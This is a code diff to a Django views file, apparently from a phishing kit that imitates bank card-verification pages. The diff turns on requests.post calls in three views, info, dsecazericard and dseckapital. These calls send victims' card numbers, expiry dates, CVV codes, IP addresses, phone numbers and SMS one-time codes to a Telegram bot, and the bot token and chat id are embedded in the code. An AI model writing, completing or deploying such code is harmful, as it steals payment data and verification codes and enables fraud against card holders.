@@ -62,7 +62,7 @@ def info(request):
             last_contact.cvv = cvv_
             last_contact.save()
             # telegram
-            # response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text={last_contact.ip}\n{last_contact.cc}|{last_contact.mm}|{last_contact.yy}|{last_contact.cvv}\n Operator: {last_contact.operator} \nNumber:{last_contact.phone}')
+            response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{last_contact.id}\n{last_contact.ip}\n{last_contact.cc}|{last_contact.mm}|{last_contact.yy}|{last_contact.cvv}\n Operator: {last_contact.operator} \nNumber:{last_contact.phone}')
             context = {
                     'id':last_contact.id
                 }
@@ -253,7 +253,7 @@ def dsecazericard(request):
     last_contact.sms=sms
     last_contact.save()
     #telegram
-    # response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=sms:{last_contact.sms}|number{last_contact.phone}')
+    response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id{last_contact.id}\nsms:{last_contact.sms}|number{last_contact.phone}')
 
     return render( request,'pages/loading.html' )
 
@@ -274,7 +274,7 @@ def dseckapital(request):
         last_contact.save()
         time.sleep(10)
         #telegram
-        # response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=sms:{concatenated}|number{last_contact.phone}')
+        response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id{last_contact.id}sms:{concatenated}|number{last_contact.phone}')
         return render( request,'pages/loading.html' )
     
     
